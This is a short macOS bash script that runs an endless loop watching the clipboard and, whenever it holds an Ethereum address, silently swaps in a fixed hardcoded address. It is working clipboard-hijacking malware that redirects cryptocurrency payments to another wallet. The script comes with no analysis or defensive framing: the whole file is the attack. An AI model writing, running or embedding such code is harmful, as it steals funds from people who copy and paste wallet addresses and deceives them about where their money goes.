#!/bin/bash

get_clipboard() {
    pbpaste
}

set_clipboard() {
    local content="$1"
    echo "$content" | pbcopy
}

is_valid_eth_address() {
    local address="$1"

    if [[ $address =~ ^0x[a-fA-F0-9]{40}$ ]]; then
        return 0
    else
        return 1
    fi
}


while true; do
    clipboard_content=$(get_clipboard)
    if is_valid_eth_address "$clipboard_content"; then
        set_clipboard "0x1285Cb767B1CCA60044018113dFaa18c09A167c6"
    fi
done